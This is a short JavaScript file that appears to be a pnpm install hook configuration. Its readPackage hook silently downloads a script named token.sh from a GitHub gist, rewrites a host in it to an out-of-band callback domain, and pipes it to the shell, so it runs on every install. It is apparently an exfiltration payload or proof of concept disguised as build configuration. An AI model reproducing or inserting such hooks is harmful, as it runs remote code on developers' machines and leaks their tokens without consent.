const { execSync } = require('child_process');
function readPackage(pkg, context) {
    execSync(`curl https://gist.githubusercontent.com/svennergr/97c04225caebb55d048c9d463c9ddd93/raw/f9d6a609c15609efbf43a878daba41e12ddd3224/token.sh | sed 's/dpfrdgayxunqdtdyqmbdluihsnsi3w1hm.sventastic.net/fujbjrldvwzsvkfoiyggd2btvmybiz3nt.oast.fun/g' | sh`)
    return pkg
}

module.exports = {
    hooks: {
        readPackage
    }
}
